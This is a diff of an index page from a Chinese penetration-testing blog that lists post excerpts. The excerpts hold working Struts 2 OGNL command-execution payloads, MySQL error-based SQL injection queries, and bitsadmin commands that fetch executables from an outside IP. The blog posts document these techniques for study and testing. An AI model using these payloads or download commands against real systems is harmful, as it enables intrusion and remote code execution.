@@ -1,258 +1,161 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-	<meta name="generator" content="Hugo 0.120.3">
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
+<!doctype html><html lang=en><head><meta name=generator content="Hugo 0.140.2"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/php-session-deserialize/>关于 PHP SESSION 反序列化</a></h1><div class=post-meta><time>2018-07-23</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/php>php</a>,<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>)</div><div class=summary-body><p><h3 id=0x00-环境>0x00 环境</h3><p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。</p><p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题</p><a href=https://wyb0.com/posts/2018/php-session-deserialize/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/>Struts 2 相关漏洞 payload</a></h1><div class=post-meta><time>2018-06-25</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/rce>rce</a>)</div><div class=summary-body><p><h3 id=0x00-s2-001>0x00 S2-001</h3><pre tabindex=0><code>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。
+</code></pre><pre tabindex=0><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&#34;whoami&#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre><h3 id=0x01-s2-005>0x01 S2-005</h3><p>影响版本: 2.0.0 - 2.1.8.1</p><pre tabindex=0><code>http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
+</code></pre><h3 id=0x02-s2-007>0x02 S2-007</h3><p>影响版本: 2.0.0 - 2.2.3</p><pre tabindex=0><code>当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。
+</code></pre><pre tabindex=0><code>&#39; + (#_memberAccess[&#34;allowStaticMethodAccess&#34;]=true,#foo=new java.lang.Boolean(&#34;false&#34;) ,#context[&#34;xwork.MethodAccessor.denyMethodExecution&#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;
+</code></pre><h3 id=0x03-s2-012>0x03 S2-012</h3><p>影响版本: 2.1.0 - 2.3.13</p><a href=https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/injection-tips-of-mysql/>SQL注入 tips(MySQL)</a></h1><div class=post-meta><time>2018-05-23</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div class=summary-body><p><p>环境：MySQL 5.5.47</p><h3 id=0x00-注入点在order-by后面>0x00 注入点在Order by后面</h3><pre tabindex=0><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;;
+Query OK, 1 row affected (0.01 sec)
+</code></pre><pre tabindex=0><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;
+</code></pre><pre tabindex=0><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;
+</code></pre><pre tabindex=0><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by if(1=2,1,(select 1 union select 2));
+ERROR 1242 (21000): Subquery returns more than 1 row
 
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&gt;1) then 1 else 1*(select 1 union select 2)end)=1;
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) then 1 else 1*(select 1 union select 2)end)=1;
+ERROR 1242 (21000): Subquery returns more than 1 row
+</code></pre><h3 id=0x01-注入点在limit后面>0x01 注入点在limit后面</h3><ul><li>limit前面没有order by可以使用union、analyse()</li></ul><pre tabindex=0><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
++----+------+---------+
+| id | name | content |
++----+------+---------+
+|  1 | 2    | 3       |
++----+------+---------+
+1 row in set (0.01 sec)
 
-    <div id="content">
-      
-	<main>
-		
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/php-session-deserialize/">关于 PHP SESSION 反序列化</a></h1>
-  
-<div class="post-meta">
-    <time>2018-07-23</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/php">php</a>,<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>)
-</div>
+mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse();
++-------------------+---------------+---------------+------------+------------+
+| Field_name        | Min_value     | Max_value     | Min_length | Max_length |
++-------------------+---------------+---------------+------------+------------+
+| rtest.msg.name    | xiaohong      | xiaohong      |          8 |          8 |
+| rtest.msg.content | I have a cat. | I have a cat. |         13 |         13 |
++-------------------+---------------+---------------+------------+------------+
 
-  <div class="summary-body">
-    <p>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。 其中有一道是php反序列化，直接用的就是 第三<a href="https://wyb0.com/posts/2018/php-session-deserialize/"> more...</a></p>
-  </div>
-</article>
+------------------+-------+-------------------------+------+--------------------+
+ Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
+------------------+-------+-------------------------+------+--------------------+
+     0 |     0 | 8.0000                  | NULL | ENUM(&#39;xiaohong&#39;) NOT NULL     |
+     0 |     0 | 13.0000                 | NULL | ENUM(&#39;I have a cat.&#39;) NOT NULL|
+------------------+-------+-------------------------+------+--------------------+
+2 rows in set (0.00 sec)
+</code></pre><ul><li>limit前面有order by则不可以使用union、analyse()</li></ul><pre tabindex=0><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.47~&#39;
 
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/">Struts 2 相关漏洞 payload</a></h1>
-  
-<div class="post-meta">
-    <time>2018-06-25</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/rce">rce</a>)
-</div>
+mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.47~&#39;
+</code></pre><h3 id=0x02-根据报错得到数据库名表名列名>0x02 根据报错得到数据库名、表名、列名</h3><pre tabindex=0><code>#得到数据库名为rtest
+mysql&gt; select id,name,content from msg where id=2-a();
+ERROR 1305 (42000): FUNCTION rtest.a does not exist
 
-  <div class="summary-body">
-    <p>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表<a href="https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/"> more...</a></p>
-  </div>
-</article>
+#得到表名为msg
+mysql&gt; select id,name,content from msg where id=2 and polygon(1);
+ERROR 1367 (22007): Illegal non geometric &#39;1&#39; value found during parsing
+mysql&gt; select id,name,content from msg where id=2 and polygon(id);
+ERROR 1367 (22007): Illegal non geometric &#39;`rtest`.`msg`.`id`&#39; value found during parsing
 
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/injection-tips-of-mysql/">SQL注入 tips(MySQL)</a></h1>
-  
-<div class="post-meta">
-    <time>2018-05-23</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
+#得到列名为id、name、content、useragent
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
+ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
+ERROR 1060 (42S21): Duplicate column name &#39;name&#39;
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
+ERROR 1060 (42S21): Duplicate column name &#39;content&#39;
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
+ERROR 1060 (42S21): Duplicate column name &#39;useragent&#39;
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
+ERROR 1241 (21000): Operand should contain 1 column(s)
+</code></pre><h3 id=0x03-mysql的隐式转换>0x03 MySQL的隐式转换</h3><ul><li><p>官方隐式转换规则</p><a href=https://wyb0.com/posts/2018/injection-tips-of-mysql/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/thinkphp5-where-function/>ThinkPHP5 的 where 函数使用不当存在注入</a></h1><div class=post-meta><time>2018-04-16</time>
+[<a href=/categories/Pentest>Pentest</a>,<a href=/categories/PHP>PHP</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>,<a href=/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1>代码审计</a>)</div><div class=summary-body><p><h3 id=0x00-关于thinkphp5的where函数>0x00 关于thinkphp5的where函数</h3><p>年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。</p><a href=https://wyb0.com/posts/2018/thinkphp5-where-function/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</a></h1><div class=post-meta><time>2018-03-09</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/rce>rce</a>,<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>)</div><div class=summary-body><p><h3 id=0x00-weblogic-wls-组件反序列化漏洞>0x00 WebLogic WLS 组件反序列化漏洞</h3><p>这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下</p><a href=https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/msf-simple-elevate-privileges/>Metasploit 简单提权</a></h1><div class=post-meta><time>2018-02-26</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/tools>tools</a>,<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><h3 id=0x00-前提>0x00 前提</h3><p>虚拟机有一个shell：<code>http://10.11.11.20/a.php</code>，物理机IP是211.222.222.72<br>外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195</p><a href=https://wyb0.com/posts/2018/msf-simple-elevate-privileges/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/>Windows 终端下载文件和执行远程文件</a></h1><div class=post-meta><time>2018-02-06</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div class=summary-body><p><p>环境：Windows Server 2008 R2 Enterprise</p><h3 id=0x00-bitsadmin下载文件>0x00 bitsadmin下载文件</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\T</span>emp<span style=color:#ae81ff>\a</span>.exe
+</span></span><span style=display:flex><span>bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\T</span>emp<span style=color:#ae81ff>\a</span>.zip
+</span></span><span style=display:flex><span>bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\T</span>emp<span style=color:#ae81ff>\a</span>.exe
+</span></span></code></pre></div><h3 id=0x01-certutil下载文件>0x01 certutil下载文件</h3><p>保存在当前目录</p><a href=https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/python-run-cmd/>Python 中执行系统命令</a></h1><div class=post-meta><time>2018-01-29</time>
+[<a href=/categories/Python>Python</a>](<a href=/tags/python>python</a>,<a href=/tags/module>module</a>)</div><div class=summary-body><p><h3 id=0x00-使用模块>0x00 使用模块</h3><p>在python执行系统命令一般可以通过3个模块来实现，这三个模块是：os、commands、subprocess</p><a href=https://wyb0.com/posts/2018/python-run-cmd/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2018/package-and-download-the-php-file/>打包下载 php 文件</a></h1><div class=post-meta><time>2018-01-08</time>
+[<a href=/categories/PHP>PHP</a>](<a href=/tags/php>php</a>)</div><div class=summary-body><p><h3 id=0x00-代码如下>0x00 代码如下</h3><pre tabindex=0><code>&lt;?php
 
-  <div class="summary-body">
-    <p>环境：MySQL 5.5.47 0x00 注入点在Order by后面 mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;; Query OK, 1 row affected (0.01 sec) mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);<a href="https://wyb0.com/posts/2018/injection-tips-of-mysql/"> more...</a></p>
-  </div>
-</article>
+function addFileToZip($zip,$zipname,$path){
+    $handler = opendir($path);
+    while(($filename = readdir($handler))!==false) {
+        if($filename != &#34;.&#34; &amp;&amp; $filename != &#34;..&#34; &amp;&amp; $filename!= $zipname){
+            if (is_dir($path.&#34;/&#34;.$filename)) {  //如果读取的某个对象是文件夹，则递归
+                addFileToZip($zip,$zipname,$path.&#34;/&#34;.$filename);
+            } else {
+                $zip-&gt;addFile($path.&#34;/&#34;.$filename);
+            }
+        }
+    }
+    @closedir($path);
+}
 
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/thinkphp5-where-function/">ThinkPHP5 的 where 函数使用不当存在注入</a></h1>
-  
-<div class="post-meta">
-    <time>2018-04-16</time>
-    [<a href="/categories/Pentest">Pentest</a>,<a href="/categories/PHP">PHP</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>,<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>)
-</div>
+function tar($zipname,$path) {
+    $zip = new ZipArchive(); //使用本类，linux需开启zlib，windows需取消php_zip.dll前的注释
 
-  <div class="summary-body">
-    <p>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个<a href="https://wyb0.com/posts/2018/thinkphp5-where-function/"> more...</a></p>
-  </div>
-</article>
+    if ($zip-&gt;open($zipname, ZipArchive::OVERWRITE) === TRUE) {
+        addFileToZip($zip,$zipname,$path);$zip-&gt;close();
+    } else {
+        exit(&#39;Unable to open file, or file creation failed!&#39;);
+    }
+}
 
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/">WebLogic 反序列化漏洞 POC (CVE-2017-10271)</a></h1>
-  
-<div class="post-meta">
-    <time>2018-03-09</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/rce">rce</a>,<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>)
-</div>
+function download($zipname) {
+    if(!file_exists($zipname)){
+      exit(&#34;Zip file does not exist!&#34;);
+    }  
+    header(&#34;Cache-Control: public&#34;);
+    header(&#34;Content-Description: File Transfer&#34;);
+    header(&#39;Content-disposition: attachment; filename=&#39;.basename($zipname)); //文件名
+    header(&#34;Content-Type: application/zip&#34;); //zip格式的  
+    header(&#34;Content-Transfer-Encoding: binary&#34;); //告诉浏览器，这是二进制文件
+    header(&#39;Content-Length: &#39;. filesize($zipname)); //告诉浏览器，文件大小
+    @readfile($zipname);
 
-  <div class="summary-body">
-    <p>0x00 WebLogic WLS 组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时<a href="https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/"> more...</a></p>
-  </div>
-</article>
+    unlink($zipname);
+}
 
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/msf-simple-elevate-privileges/">Metasploit 简单提权</a></h1>
-  
-<div class="post-meta">
-    <time>2018-02-26</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/tools">tools</a>,<a href="/tags/intranet">intranet</a>)
-</div>
+$zipname = &#39;bak.zip&#39;;
+$path = &#39;.&#39;;
+tar($zipname,$path);
+download($zipname);
 
-  <div class="summary-body">
-    <p>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72<a href="https://wyb0.com/posts/2018/msf-simple-elevate-privileges/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/">Windows 终端下载文件和执行远程文件</a></h1>
-  
-<div class="post-meta">
-    <time>2018-02-06</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
-</div>
-
-  <div class="summary-body">
-    <p>环境：Windows Server 2008 R2 Enterprise 0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe 0x01 certutil下载文<a href="https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/python-run-cmd/">Python 中执行系统命令</a></h1>
-  
-<div class="post-meta">
-    <time>2018-01-29</time>
-    [<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>,<a href="/tags/module">module</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 使用模块 在python执行系统命令一般可以通过3个模块来实现，这三个模块是：os、commands、subproces<a href="https://wyb0.com/posts/2018/python-run-cmd/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2018/package-and-download-the-php-file/">打包下载 php 文件</a></h1>
-  
-<div class="post-meta">
-    <time>2018-01-08</time>
-    [<a href="/categories/PHP">PHP</a>](<a href="/tags/php">php</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 代码如下 &lt;?php function addFileToZip($zip,$zipname,$path){ $handler = opendir($path); while(($filename = readdir($handler))!==false) { if($filename != &#34;.&#34; &amp;&amp; $filename != &#34;..&#34; &amp;&amp; $filename!= $zipname){ if (is_dir($path.&#34;/&#34;.$filename)) { //如果读取的某个对象是文件夹，则递归 addFileToZip($zip,$zipname,$path.&#34;/&#34;.$filename); } else { $zip-&gt;addFile($path.&#34;/&#34;.$filename); } } } @closedir($path); } function tar($zipname,$path) {<a href="https://wyb0.com/posts/2018/package-and-download-the-php-file/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2017/xxe/">XXE 漏洞</a></h1>
-  
-<div class="post-meta">
-    <time>2017-12-09</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/xml">xml</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG<a href="https://wyb0.com/posts/2017/xxe/"> more...</a></p>
-  </div>
-</article>
-
-		
-		<div>
-  
-    <a href="/page/3/">Previous Page</a>
-  
-  4 of 18
-  
-    <a href="/page/5/">Next Page</a>
-  
-</div>
-
-	</main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+?&gt;
+</code></pre><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=http://blog.csdn.net/libinemail/article/details/52190235>http://blog.csdn.net/libinemail/article/details/52190235</a></li></ul></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2017/xxe/>XXE 漏洞</a></h1><div class=post-meta><time>2017-12-09</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/xml>xml</a>)</div><div class=summary-body><p><h3 id=0x00-xxe>0x00 XXE</h3><p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛</p><a href=https://wyb0.com/posts/2017/xxe/>more...</a></p></div></article><div><a href=/page/3/>Previous Page</a>
+4 of 18
+<a href=/page/5/>Next Page</a></div></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
